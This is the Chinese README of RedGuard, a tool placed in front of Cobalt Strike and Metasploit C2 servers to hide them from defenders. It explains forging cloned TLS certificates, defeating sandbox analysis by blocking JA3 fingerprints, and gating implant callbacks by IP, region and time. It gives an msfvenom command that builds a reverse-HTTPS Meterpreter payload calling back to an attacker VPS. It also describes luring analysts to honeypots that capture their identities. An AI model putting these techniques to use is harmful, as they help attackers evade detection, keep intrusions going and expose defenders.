<h1 align="center">RedGuard - Excellent C2 Front Flow Control tool</h1>

[![GitHub stars](https://img.shields.io/github/stars/wikiZ/RedGuard)](https://github.com/knownsec/Kunyu) [![GitHub issues](https://img.shields.io/github/issues/wikiZ/RedGuard)](https://github.com/knownsec/Kunyu/issues) [![GitHub release](https://img.shields.io/github/release/wikiZ/RedGuard)](https://github.com/knownsec/Kunyu/releases) [![](https://img.shields.io/badge/author-风起-blueviolet)](https://github.com/wikiZ) 

中文文档 | [English](https://github.com/wikiZ/RedGuard/blob/main/README.md)

![1653117445(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/42d448a4cd030c05bacb8bde759b5d8.png)

# 0x00 介绍

## 工具介绍

RedGuard，是一款C2设施前置流量控制技术的衍生作品，有着更加轻量的设计、高效的流量交互、以及使用go语言开发具有的可靠兼容性。它所解决的核心问题也是在面对日益复杂的红蓝攻防演练行动中，给予攻击队更加优秀的C2基础设施隐匿方案，赋予C2设施的交互流量以流量控制功能，拦截那些“恶意”的分析流量，更好的完成整个攻击任务。

RedGuard是一个C2设施前置流量控制工具，可以避免Blue Team,AVS,EDR,Cyberspace Search Engine的检查。  

## 应用场景

- 攻防演练中防守方根据态势感知平台针对C2交互流量的分析溯源
- 根据JA3指纹库识别防范云沙箱环境下针对木马样本的恶意分析
- 阻止恶意的请求来实施重放攻击，实现混淆上线的效果
- 在明确上线服务器IP的情况下，以白名单的方式限制访问交互流量的请求
- 防范网络空间测绘技术针对C2设施的扫描识别，并重定向或拦截扫描探针的流量
- 支持对多个C2服务器的前置流量控制，并可实现域前置的效果实现负载均衡上线，达到隐匿的效果
- 能够通过请求IP反查API接口针对根据 IP 地址的归属地进行地域性的主机上线限制
- 在不更改源码的情况下，解决分阶段checksum8规则路径解析存在的强特征。
- 通过目标请求的拦截日志分析蓝队溯源行为，可用于跟踪对等连接事件/问题
- 具有自定义对样本合法交互的时间段进行设置，实现仅在工作时间段内进行流量交互的功能
- Malleable C2 Profile 解析器能够严格根据 malleable profile验证入站 HTTP/S 请求，并在违规情况下丢弃外发数据包（支持Malleable Profiles 4.0+）
- 内置大量与安全厂商相关联的设备、蜜罐、云沙箱的IPV4地址黑名单，实现自动拦截重定向请求流量
- 可通过自定义工具与样本交互的SSL证书信息、重定向URL，以规避工具流量的固定特征
- ..........

# 0x01 安装

可以直接下载并使用已经编译好的版本，也可以远程下载go包进行自主编译执行。

```bash
git clone https://github.com/wikiZ/RedGuard.git
cd RedGuard
# 也可以使用upx压缩编译后的文件体积
go build -ldflags "-s -w" -trimpath
# 赋予工具可执行权限，并进行初始化操作
chmod +x ./RedGuard&&./RedGuard

```

# 0x02 配置说明

## 初始化

如下图，首先对RedGuard赋予可执行权限并进行初始化操作，第一次运行会在当前用户目录下生成配置文件，以实现灵活的功能配置，**配置文件名：.RedGuard_CobaltStrike.ini**。

![1653117707(1).png](https://raw.githubusercontent.com/wikiZ/RedGuardImage/main/1692550594507.png)

**配置文件内容：**

![1653117707(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/1692550409350.png)

cert的配置选项主要是针对样本与C2前置设施的HTTPS流量交互证书的配置信息，proxy主要用于配置反向代理流量中的控制选项，具体使用会在下面进行详细讲解。

在流量的交互中使用的SSL证书会生成在RedGuard执行所在目录下的cert-rsa/目录下，可以通过修改配置文件进行工具的基础功能启停**(证书的序列号是根据时间戳生成的，不用担心被以此关联特征)**。如果你想要使用自己的证书，只需要重命名为ca.crt和ca.key覆盖在cert-rsa/目录下即可。

```bash
openssl x509 -in ca.crt -noout -text
```

![1653118330(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/1656308972417.jpg)

每次启动RedGuard都会更新随机TLS JARM指纹，防止被以此佐证C2设施。

![1653118330(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/d2d8d30fcd349bd4567c685aaa93451.jpg)

在使用自己证书的情况下，到配置文件中修改HasCert参数为true，防止因为JARM混淆随机化导致的CipherSuites加密套件与自定义证书不兼容导致的无法正常通信问题。

```bash
# Whether to use the certificate you have applied for true/false
HasCert      = false
```

### 伪造TLS证书

在部署域前置隐匿C2流量时，默认情况下加速的域名是不具备HTTPS证书信息的，这样显然是存在问题的，所以配置域名时需要注意对证书进行配置，这也是判断样本是否为域前置流量的默认依据。

![1653118330(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/1.png)

[^腾讯云]: 内容分发网络证书配置

相信看到这里，大家会有所疑问，**配置的证书怎么获得？如果使用自己申请证书是不符合我们预期想达到的隐匿效果。** 这里可以使用克隆的证书进行配置，以腾讯云为例，测试中发现其不会对自定义上传的证书进行校验有效性，我们可以使用与加速域名实际站点相同的证书进行伪造。虽然伪造的证书在正常情况下替换CS的默认证书是无法通信的，但是在云服务厂商CDN全站加速和RedGuard上面部署是不会进行校验有效性并且可以正常通信C2交互流量。

**以下为Github已有项目地址**

```bash
https://github.com/virusdefender/copy-cert
```

尽管样本域前置流量侧的证书已经解决，但是站在大网测绘的角度来看，我们的C2服务器仍然暴露于外，依然可能被探测到真实C2服务器并实现关联，这时就可以通过RedGuard修改C2的前置默认证书实现隐匿。

![1653118330(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/2.png)

[^微步社区情报信息]: 数字证书

以上即为C2服务器伪造的证书效果，可以看到在微步社区的情报中是可信且未过期的状态，而其获取数字证书的主要途径也是在云沙箱进行样本分析时进行提取并实时更新的，但是显然没有经过有效校验，状态值仅对失效时间进行验证，证书可信验证应该是只以是否能够正常通信作为判断依据。

需要注意的是，微步情报并不会对样本请求的SNI及HOST的地址进行标注证书情报，这其实也是出于防止出现误报的考量，**我认为这是正确的，作为辅佐研判人员分析的重要依据，威胁情报宁可不全，也最好不要出现错误指向，对后续分析造成误判。** 如果说在全站加速配置证书是伪造通信流量的证书，那么配置RedGuard C2的前置响应证书就是为了针对部署于公网的真实C2服务器的行为特征进行伪造，以实现抗测绘的效果，这是十分必要的。

提取证书序列号：`55e6acaed1f8a430f9a938c5`，进行HEX编码得到TLS证书指纹为：`26585094245224241434632730821`

|       IP       | Port | Protocol |   Service    | Country |  City  |         Title         |    Time    |
| :------------: | :--: | :------: | :----------: | :-----: | :----: | :-------------------: | :--------: |
| 103.211.xx.90  | 443  |  https   | Apache httpd |  China  | Suzhou | 百度图片-发现多彩世界 | 2023-08-28 |
| 223.113.xx.207 | 443  |  https   |     JSP3     |  China  | Xuzhou |     403 Forbidden     | 2023-08-28 |
| 223.112.xx.48  | 443  |  https   |     JSP3     |  China  | Xuzhou |     403 Forbidden     | 2023-08-28 |
| 223.113.xx.40  | 443  |  https   |     JSP3     |  China  | Xuzhou |     403 Forbidden     | 2023-08-28 |
| 223.113.xx.31  | 443  |  https   |     JSP3     |  China  |        |    405 Not Allowed    | 2023-08-28 |
| 223.113.xx.206 | 443  |  https   |     JSP3     |  China  | Xuzhou |     403 Forbidden     | 2023-08-28 |

**Search Result Amount: 2291**

通过网络空间测绘发现2291个独立IP，进行验证确定均为百度所属TLS证书，如果单从通信流量来看是比较难判断是否为恶意通信的，而上面针对域前置+C2前置流量设施的TLS证书进行了伪造，成功对空间测绘与威胁情报实现了干扰，造成了错误的信息关联，使得攻击者的流量特征更加逼真，实现了伪造正常通信流量的目的。

![1653118330(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/3.png)

[^RedGuard]: 使用默认证书的RG资产

哪怕在C2流量前置设施之前不存在隐匿转发的处理，也最好对RedGuard进行更改证书。默认状态下，任何目前在网络空间测绘里常用的通用组件指纹识别形成的指纹库就是利用了通用组件默认配置特征这个**行为**来进行识别的，在这些自定义过程中不同的群体又可能表现出不一样的独有特征。当然，指纹的形成需要对目标组件具有一定理解，从而提取出目标的默认特征，形成关联指纹。这里利用RG证书表现的行为特征进行网络空间测绘，关联到了大量部署在公网的RG节点。

**作者能够提取出该指纹不足为奇，但是依然建议RedGuard用户修改的默认证书信息，做一个专业的Hacker:)**

## RedGuard Usage

```bash
root@VM-4-13-ubuntu:~# ./RedGuard -h

Usage of ./RedGuard:
  -DelHeader string
        Customize the header to be deleted
  -DropAction string
        RedGuard interception action (default "redirect")
  -EdgeHost string
        Set Edge Host Communication Domain (default "*")
  -EdgeTarget string
        Set Edge Host Proxy Target (default "*")
  -FieldFinger string
        Set HTTP Header identification field Info
  -FieldName string
        Set the name of the HTTP Header identification field
  -HasCert string
        Whether to use the certificate you have applied for (default "true")
  -allowIP string
        Proxy Requests Allow IP (default "*")
  -allowLocation string
        Proxy Requests Allow Location (default "*")
  -allowTime string
        Proxy Requests Allow Time (default "*")
  -common string
        Cert CommonName (default "*.aliyun.com")
  -config string
        Set Config Path
  -country string
        Cert Country (default "CN")
  -dns string
        Cert DNSName
  -host string
        Set Proxy HostTarget
  -http string
        Set Proxy HTTP Port (default ":80")
  -https string
        Set Proxy HTTPS Port (default ":443")
  -ip string
        IPLookUP IP
  -locality string
        Cert Locality (default "HangZhou")
  -location string
        IPLookUP Location (default "风起")
  -malleable string
        Set Proxy Requests Filter Malleable File (default "*")
  -organization string
        Cert Organization (default "Alibaba (China) Technology Co., Ltd.")
  -redirect string
        Proxy redirect URL (default "https://360.net")
  -type string
        C2 Server Type (default "CobaltStrike")
  -u    Enable configuration file modification
  
```

**P.S. 可以使用参数命令的方式修改配置文件，当然我觉得可能直接vim手动修改更方便。**

# 0x03 工具使用

## 基础拦截

如果直接对反向代理的端口进行访问，则会触发拦截规则，这里通过输出的日志可以看到客户端请求根目录，但是因为其请求过程未带有请求的凭证，也就是正确的HOST请求头所以触发了基础拦截的规则，流量被重定向到了https://360.net

这里为了方便展示输出效果，实际使用可以通过`nohup ./RedGuard &`后台运行。

![1653130661(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/1656309416534.png)

```bash
{"360.net":"http://127.0.0.1:8080","360.com":"https://127.0.0.1:4433"}
```

从上面的slice不难看出，360.net对应了代理到本地8080端口，360.com指向了本地的4433端口，且对应了使用的HTTP协议的不同，在后续上线中，需要注意监听器的协议类型需要和这里设置的保持一致，并设置对应HOST请求头。

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656309543334.jpg)

如上图，在未授权情况下，我们得到的响应信息也是重定向的站点返回信息。

## 拦截方式

上述的基础拦截案例中，使用的是默认的拦截方式，也就是将非法流量以重定向的方式拦截，而通过配置文件的修改，我们可以更改拦截的方式，以及重定向的站点URL，其实这种方式与之说是重定向，描述为劫持、克隆或许更贴切，因为返回的响应状态码为200，是从另一个网站获取响应，以尽可能接近地模仿克隆/劫持的网站。

无效数据包可能会根据三种策略被错误路由：

- **reset**：立即终止 TCP 连接。
- **proxy**：从另一个网站获取响应，以尽可能接近地模仿克隆/劫持的网站。
- **redirect**：重定向到指定网站返回HTTP状态码307，对重定向的网站无要求。

```bash
# RedGuard interception action: redirect / rest / proxy (Hijack HTTP Response)
drop_action   = proxy
# URL to redirect to
Redirect      = https://360.net
```

配置文件中 **Redirect = URL**  指向的就是劫持的URL地址，RedGuard支持“热更改”，也就是说在工具通过nohup这种方式在后台运行的过程中，我们依旧可以通过修改配置文件的内容进行实时的功能启停。

```bash
./RedGuard -u --drop true
```

注意，通过命令行修改配置文件的时候。-u选项不要少，否则无法对配置文件修改成功，如果需要还原默认配置文件设置只需要输入 `./RedGuard -u` 即可。

而另一种拦截方式就是DROP，直接Close HTTP通信响应，通过设置 **DROP = true** 启用，具体拦截效果如下图：

![1653132755(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/1656310664285.jpg)

可以看到，没有获取到HTTP响应码，C2前置流量控制对非法请求直接close响应，在网络空间测绘的探测中，DROP的方式可以实现隐藏端口开放情况的作用，具体效果可以看下面的案例分析。

### 劫持站点响应

相信不少用户对**劫持响应**会比较感兴趣，大概原理为当客户端对真实的C2服务器发起请求时，由于不符合入站规则，所以C2服务器会获取指定的正常站点并返回其响应信息，所以从效果请求端来看好像是与该IP进行服务交互，但是实际是以中间C2服务器为代理服务器与正常站点进行交互，很难发现异常。而如果符合入站请求时，则会将流量请求转发至真实的C2服务监听端口进行交互，而真实监听端口已经被云防火墙过滤，仅允许本机访问，从外部是无法直接访问的。**所以从外部端口开放情况来看仅开放了该HTTP/S端口，而某种意义来说这也确实为C2的上线端口。**

![1](https://github.com/wikiZ/RedGuardImage/blob/main/7.png?raw=true)

[^流量示意图]: C2服务器流量交互过程

在网络空间测绘数据中，该IP的HTTP/S开放端口响应码为200，不是302跳转，更加具有真实性。

![1](https://github.com/wikiZ/RedGuardImage/blob/main/8.png?raw=true)

HTTPS证书与上述伪造证书效果相同，均为真实证书的指纹。

![1](https://github.com/wikiZ/RedGuardImage/blob/main/9.png?raw=true)

相信不少红队在打项目的过程中，都会广泛的使用云函数/域前置一类的隐匿手段，但是在今天的攻防对抗的博弈中，上述两种隐匿手段均存在一个致命的问题，就是可以直接连通C2服务，而这些导致结果无疑就是当我们掌握到云函数地址或者域前置的交互IP/HOST即可直接访问C2监听服务并证明其为攻击设施。

![1](https://github.com/wikiZ/RedGuardImage/blob/main/11.png?raw=true)

**由于流量可以直接到达C2，那么这里不妨思考一下，安全设备针对SNI与HOST不相符的流量是否可以进行CS扫描来识别是否为恶意流量，云函数或者沙箱环境也为同理，除去样本侧也可以多一些流量层面的分析过程。**

而当进行劫持响应后，直接访问HTTP服务是可以正常网站交互的，但是Cscan是无法扫描出样本信息的，因为流量无法到达真实的C2监听器，只有当满足流量发起的特征时才可以正常C2交互，但是这就存在一个问题，C2扫描的脚本需要符合入站规则，这对蓝队分析人员的代码能力也就具有了一定考验，目前公开的扫描脚本为Nmap形式的。

![1](https://github.com/wikiZ/RedGuardImage/blob/main/12.png?raw=true)

## JA3指纹识别云沙箱分析流量

JA3为客户端与服务器之间的加密通信提供了识别度更高的指纹，通过 TLS 指纹来识别恶意客户端和服务器之间的 TLS 协商，从而实现关联恶意客户端的效果。该指纹使用MD5加密易于在任何平台上生成，目前广泛应用于威胁情报，例如在某些沙箱的样本分析报告可以看到以此佐证不同样本之间的关联性。

如果可以掌握 C2 服务器与恶意客户端的JA3(S)，即使加密流量且不知道 C2 服务器的 IP 地址或域名，我们仍然可以通过 TLS 指纹来识别恶意客户端和服务器之间的 TLS 协商。**相信看到这里大家就能想到，这也正是对付域前置、反向代理、云函数等流量转发隐匿手段的一种措施，通过沙箱执行样本识别与C2之间通信的 TLS 协商并生成JA3(S)指纹，以此应用于威胁情报从而实现辅助溯源的技术手段。**

该技术在2022年的时候我就已经公布，在测试微步沙箱环境时发现，其请求交互的出口IP虽然数量不大，但是通过IP识别沙箱并不准确，并且这是很容易改变的特征，但是其在相同系统环境下JA3指纹是唯一的。后续得到反馈称沙箱已完成指纹随机化，但是近期通过测试发现仍没有完全实现，还是希望可以正视流量侧指纹的问题。

**目前主要为以下JA3指纹：**

- 55826aa9288246f7fcafab38353ba734

在云沙箱的立场上，通过监控样本与C2服务器之间流量交互生成JA3(S)指纹识别恶意客户端从而进行关联，而我们逆向思考，同样作为C2前置的流量控制设施，我们也可以进行这样的操作获取客户端请求的JA3指纹，通过对不同沙箱环境的调试获取这些JA3指纹形成指纹库从而形成基础拦截策略。

设想在分阶段木马交互的过程中，加载器会首先拉取远程地址的shellcode，那么在流量识别到请求符合JA3指纹库的云沙箱特征时，就会进行拦截后续请求。那么无法获取shellcode不能完成整个加载过程，沙箱自然不能对其完整的分析。如果环境是无阶段的木马，那么沙箱分析同样无法最终上线到C2服务器上，想必大家都有睡一觉起来C2上挂了一大堆超时已久的沙箱记录吧，当然理想状态下我们可以对不同沙箱环境进行识别，这主要也是依赖于指纹库的可靠性。

在测试的过程中，我发现在指纹库添加ZoomEye GO语言请求库的JA3指纹后监测RG请求流量情况，大部分的请求均触发了JA3指纹库特征的基础拦截，这里我猜测该测绘产品底层语言是以GO语言实现的部分扫描任务，通过一条链路，不同底层语言组成的扫描逻辑最终完成了整个扫描任务，这也就解释了部分测绘产品的扫描为什么触发了GO语言请求库的JA3指纹拦截特征。**而其与云沙箱指纹的识别规则原理是相同，均利用了请求客户端环境及请求库的唯一性，区别于PC端，这些产品的请求环境基本上是不会随意更改的，这也导致了我们能够掌握到其流量侧指纹并拦截**，那么是否可以思考安全设备是否可以把主动探测流量的JA3指纹作为拦截依据？当然，当业务流量较大时可能会有一定的误报，这里仅提出理论上可实施的产品需求。

**P.S.读者也可以自行上传样本至沙箱中获取并验证其JA3指纹添加至指纹库，需要注意的是，如果沙箱仅更改JA3指纹不为上述指纹是没有意义的，真正需要解决的是每次沙箱动态分析时均不为同一指纹，而其变化需要满足尽可能的不重复，如果重复率较高依然会被作为指纹使用。**

目前支持针对微步云沙箱的识别拦截作为效果演示

![1653132755(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/ebd60b93323db5096328e8f20a2f1df.jpg)

## 代理端口修改

这里其实就很好理解了，对配置文件中以下两个参数的配置实现更改反向代理端口的效果，这里建议在不与当前服务器端口冲突的前提下，使用默认的端口隐匿性会更好，如果一定要修改，那么注意参数值的 **:** 不要缺少

```bash
# HTTPS Reverse proxy port
Port_HTTPS = :443
# HTTP Reverse proxy port
Port_HTTP = :80
```

## RedGuard日志

通过目标请求的拦截日志分析蓝队溯源行为，可用于跟踪对等连接事件/问题，日志文件生成在运行RedGuard所在目录下，**文件名：RedGuard.log**。

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656310909975.jpg)

## RedGuard获取真实IP地址

针对于日常、域前置场景下获取真实请求IP，RG无需进行任何配置，仅需对启动C2设施的profile文件增加以下配置，即通过请求头X-Forwarded-For获取目标真实IP。

```bash
http-config {
    set trust_x_forwarded_for "true";
}
```

## 请求地域限制

配置方式以AllowLocation = 济南,北京 为例，这里值得注意的是，RedGuard提供了两个IP归属地反查的API，一个适用于国内用户，另一个适用于海外用户，并且可以根据输入的地域名动态的分配使用哪个API，如果目标是中国的那么设置的地域就输入中文，反之输入英文地名，建议国内的用户使用中文名即可，这样反查到的归属地准确度以及API的响应速度都是最好的选择。

P.S. 国内用户，不要使用**AllowLocation = 济南,beijing**这种方式！没啥意义，参数值的首个字符决定使用哪个API！

```bash
# IP address owning restrictions example:AllowLocation = 山东,上海,杭州 or shanghai,beijing
AllowLocation = *
```

![1653134160(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/1656311033506.jpg)

决定限制地域之前，可以通过以下命令手动查询IP地址归属地。

```bash
./RedGuard --ip 111.14.218.206
./RedGuard --ip 111.14.218.206 --location shandong # 使用海外API查询归属地
```

这里我们设置仅允许山东地域上线

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/20220521200158-d0d34d6c-d8fd-1.png)

**合法流量：**

![1653137496(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/20220521205147-c6bb200a-d904-1.png)

**非法请求地域：**

![1653137621(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/20220521205347-0dbc1efa-d905-1.png)

关于地域限制的上线，在目前的攻防演练可能比较实用，基本上省市级的护网限制的目标都是在指定区域中，而对于其他地域请求的流量自然可以忽略不计，而RedGuard这一功能不仅仅可以限制单一地域也可以根据省、市限制多个上线地域，而对其他地域请求的流量进行拦截。

## 基于白名单拦截

除了RedGuard内置的安全厂商IP的黑名单，我们还可以依据白名单的方式进行限制，其实我也是建议在web打点的时候，我们可以根据白名单限制上线的IP的地址，以，分割多个IP地址的方式。

```bash
# Whitelist list example: AllowIP = 172.16.1.1,192.168.1.1
AllowIP       = 127.0.0.1
```

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656311197849.png)

如上图，我们限制仅允许127.0.0.1上线，那么其他IP的请求流量就会被拦截。

## 基于时间段拦截

这个功能就比较有意思了，在配置文件中设置以下参数值，代表了流量控制设施仅可以上午8点至晚上9点上线，这里具体的应用场景也就是在指定攻击时间内，我们允许与C2进行流量交互，其他时间保持静默状态。这也能让红队们睡一个好觉，不用担心一些夜班的蓝队无聊去分析你的木马，然后醒来发生不可描述的事情，哈哈哈。

```bash
# Limit the time of requests example: AllowTime = 8:00 - 16:00
AllowTime     = 8:00 - 21:00
```

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656311327769.png)

## Malleable Profile

RedGuard采用 Malleable C2 配置文件。然后，它解析提供的可延展配置文件部分以了解合同并仅通过那些满足它的入站请求，同时误导其他请求。诸如`http-stager`,`http-get`和`http-post`它们对应的 uris, headers, User-Agent 等部分都用于区分合法信标的请求和不相关的 Internet 噪声或 IR/AV/EDR 越界数据包。

```bash
# C2 Malleable File Path
MalleableFile = /root/cobaltstrike/Malleable.profile
```

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656311591693.png)

风起编写的profile，推荐使用：

> https://github.com/wikiZ/CobaltStrike-Malleable-Profile

## 自定义删除响应字段

在 Cobalt Strike 4.7+ 中，Teamserver 会在没有任何通知的情况下自动删除 Content-Encoding 标头，从而可能导致违反可延展http-(get|post).server。而且如果CS Server响应报文中没有Content-type，但经过RedGuard转发后，在响应报文头中添加了Content-Type，导致cf缓存页面，造成干扰。

在RedGuard 23.08.21版本后增加了自定义响应包Header头的功能，用户可以通过修改配置文件的方式进行自定义删除的响应包中的Header信息，以解决错误解析的问题。

```bash
# Customize the header to be deleted example: Keep-Alive,Transfer-Encoding
DelHeader     = Keep-Alive,Transfer-Encoding
```

## Sample FingerPrint

RedGuard 23.05.13已更新木马样本指纹识别功能，该功能基于对Malleable Profile自定义设置HTTP Header字段作为该指纹“**样本Salt值**”，为相同**C2监听器/**Header Host提供唯一辨识。此外，结合其他相关请求字段生成的木马样本指纹，可用于检测自定义样本存活性。根据攻击方任务要求，木马样本指纹识别功能可针对希望失效的样本进行**“下线操作”**，更好地规避恶意研判流量的样本通联性关联及分阶段样本PAYLOAD攻击载荷获取分析，给予攻击方更加个性化的隐匿措施。

针对不同C2监听器，我们可以给不同的Malleable Profile配置别称、自定义相关header的字段名和值作为样本Salt值，以此作为区分不同样本之间的辨识之一。下列代码是为了方便说明，而在实际攻防场景下我们可以给予更加贴合实际的HTTP请求包字段作为判断依据。

```bash
http-get "listen2" {
	set uri "/image.gif";
	client {
		header "Accept-Finger" "866e5289337ab033f89bc57c5274c7ca"; //用户自定义字段名及值
		metadata {
			print
		}
	}
}
```

**HTTP流量**

![image.png](https://raw.githubusercontent.com/wikiZ/RedGuardImage/main/10b7b4d8f1d66bbf98e404332bf5d87.png)

如图所示，我们根据上述样本Salt值及Host字段作为指纹生成依据，这里我们已知:

- **Salt值：866e5289337ab033f89bc57c5274c7ca**
- **Host字段值：redguard.com**

根据对上述值进行拼接得到sample指纹为：

```bash
22e6db08c5ef1889d64103a290ac145c
```

目前已知上述样本指纹，现在我们在RedGuard配置文件中设置自定义的Header字段及样本指纹用于恶意流量拦截。值得注意的是，我们可以拓展多个样本指纹，不同指纹之间以逗号分隔，FieldName需要和Malleable Profile中配置的Header字段名称保持一致。

![image.png](https://raw.githubusercontent.com/wikiZ/RedGuardImage/main/aa7488ece6370ff2559400a108664a4.png)

因为RedGuard的配置文件为热配置，所以这里我们不需要重新启停RG即可实现针对希望失效的样本进行拦截，当我们希望该样本重新生效时，只需在RG配置文件中删除相关样本指纹即可实现。

**演示效果**

![image.png](https://raw.githubusercontent.com/wikiZ/RedGuardImage/main/4d37798254ba9b5729ac886f90a10f7.png)

# 0x04 案例分析

## CobaltStrike上线

如果说上面的这种方式有一个问题就是，实际上线的C2服务器是不能通过防火墙直接拦截掉的，因为在反向代理中实际进行负载均衡请求的是云服务器厂商IP进行的。

如果是单兵作战的话，我们可以在云服务器防火墙设置拦截策略。

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/20220522150356-58b9586c-d99d-1.png)

然后把代理指向的地址设置为https://127.0.0.1:4433这种即可。

```bash
{"360.net":"http://127.0.0.1:8080","360.com":"https://127.0.0.1:4433"}
```

而且因为我们的基础验证就是基于HTTP HOST请求头来做的，所以在HTTP流量中看到的也是与域前置的方式一致，但是成本更低，只需要一台云服务器即可实现。

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/20220522150942-26f6c264-d99e-1.png)

对于监听器的设置上线端口设置为RedGuard反向代理端口，监听端口为本机实际上线端口。

## Metasploit上线

**生成木马**

```bash
$ msfvenom -p windows/meterpreter/reverse_https LHOST=vpsip LPORT=443 HttpHostHeader=360.com 
-f exe -o ~/path/to/payload.exe
```

当然作为域前置场景也可以把你的LHOST配置为任意使用该厂商CDN的域名，注意设置HttpHostHeader与RedGuard相符即可。

```bash
setg OverrideLHOST 360.com
setg OverrideLPORT 443
setg OverrideRequestHost true
```

请务必注意，该`OverrideRequestHost`设置必须设置为`true`。这是由于 Metasploit 在为暂存有效负载生成配置时默认处理传入 HTTP/S 请求的方式的一个怪癖。默认情况下，Metasploit 将传入请求的`Host`标头值（如果存在）用于第二阶段配置，而不是`LHOST`参数。因此，将生成阶段配置，以便将请求直接发送到您的隐藏域名，因为 CloudFront 在转发请求的`Host`标头中传递您的内部域。这显然不是我们所要求的。使用`OverrideRequestHost`配置值，我们可以强制 Metasploit 忽略传入`Host`的标头，而是使用`LHOST`指向原始 CloudFront 域的配置值。

监听器设置为实际上线端口，与RedGuard实际转发到的地址相匹配。

![867551fe860b10ca1396498a85422b4.jpg](https://github.com/wikiZ/RedGuardImage/raw/main/73315c83562826f16f64e2b277736c1.png)

RedGuard接收到请求：

![867551fe860b10ca1396498a85422b4.jpg](https://github.com/wikiZ/RedGuardImage/raw/main/159a00e6c5596bc3542701b4a8020b1.png)

## 空间测绘

如下图所示，当我们的拦截规则设置为DROP的时候，空间测绘系统探针会对我们反向代理端口的/目录进行几次探测，理论上测绘发送的请求包就是伪造成正常的流量所示。但是当尝试几次因为请求包特征不符合RedGuard的放行要求，所以均被Close HTTP响应。最终展现在测绘平台上的效果也就是认为反向代理端口未开放。

![image.png](https://raw.githubusercontent.com/wikiZ/RedGuardImage/main/1656312184116.png)

下图所示的流量也就是当拦截规则设置为Redirect时，我们会发现当测绘探针收到响应后会继续对我们进行目录扫描，UserAgent为随机，看起来符合正常流量的请求，但是也都成功被拦截了。

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656312557035.png)

**测绘平台 - 劫持响应拦截方式效果：**

![1653200439(1).jpg](https://github.com/wikiZ/RedGuardImage/raw/main/1656313188878.png)

**测绘平台 - 重定向拦截方式效果：**

![1653200439(1).jpg](https://github.com/wikiZ/RedGuardImage/raw/main/1656406644535.jpg)

## 域前置

RedGuard是支持域前置的，在我看来一共有两种展现形式，一种是利用传统的域前置方式，在全站加速回源地址中设置为我们反向代理的端口即可实现。在原有的基础上给域前置增加了流量控制的功能，并且可以根据我们设置的重定向到指定URL使其看起来更像是真的。需要注意HTTPS HOST头RedGuard设置的要与全站加速的域名一致才可以。

![1653201007(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/20220522143012-a26ab442-d998-1.png)

在单兵作战中，我建议可以使用上述方式，而在团队任务中，也可以通过自建“域前置”的方式来实现。 

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/20220522143837-cf77a944-d999-1.png)

在自建域前置中，保持多个反向代理端口一致，HOST头一致指向后端真实的C2服务器监听端口。而这种方式，可以很好的隐藏我们的真实C2服务器，而反向代理的服务器可以通过配置防火墙仅开放代理端口即可。

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656313773114.jpg)

这里可以通过多个节点服务器实现，在CS监听器HTTPS上线IP配置多个我们的节点IP。

## 蜜罐恶意诱捕

**蜜罐恶意诱捕的原理主要是依赖于RG流量导向的劫持响应or重定向功能，将研判C2设施的分析者导向蜜罐沙箱的地址，在劫持响应的状态下，RG会将不符合入站规则的请求流量导向蜜罐资产中**，而碰到一些比较厉害的蜜罐（例如抓取运营商手机号那种），客户端就会依照目标站点的响应发起请求被jsonp劫持到相关信息。

试想，当分析人员对C2上线端口直接访问就会被导向至蜜罐资产，造成的结果无疑就是对分析人员造成了扰乱，而分析人员被恶意导向请求蜜罐资产，蜜罐监测端则捕获到蓝队分析人员的相关信息从而错误溯源。如果从开始分析目标就是错误的，又怎么会得到好的结果，无疑对防守队伍造成了严重的内耗。

**这里给大家提供一组关联蜜罐资产的ZoomEye指纹：**

```bash
(iconhash:"9fd6f0e56f12adfc2a4da2f6002fea7a" (title:"然之协同" +"iframe" +">v.ignoreNotice")) ("/static/js/2.ca599e2d.chunk.js?t=" +title:"OA办公系统") ("data.sloss.xyz/get_code.js?access") ("/monitordevinfo/common.js") (app:"honeyport" +country:china +after:"2022-08-22")
```

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/4.png)

而实现这一效果的方式非常简单，仅需更改RG配置文件相关键值即可。

```bash
# RedGuard interception action: redirect / reset / proxy (Hijack HTTP Response)
drop_action   = proxy
# URL to redirect to
Redirect      = https://market.baidu.com
```

**P.S.相信不解释大家也知道该怎么配置:)**

该方式算是一种奇淫巧计吧，更多的是体现在思路上，如果进一步利用就可以在C2前置流量控制设施部署蜜罐捕获的功能然后再进行交互流量导向，效果也就是如传统蜜罐一样能够获取客户端的浏览器缓存数据。但是个人感觉在公开版本中，应用于现阶段的攻防对抗可能意义不大，攻击者捕获得到蓝队分析人员的社交信息再进行溯源是无意义的操作。当然退一步来想，这或许会让C2样本的分析更加危险，当黑灰产的攻击者能够获取得到分析人员的虚拟身份后，如果能够做到虚实身份的转换，那么还是比较危险的。**所以我认为，以后的研判分析应该更加谨慎，提高警惕意识。**

## 基于边界节点链路交互C2流量

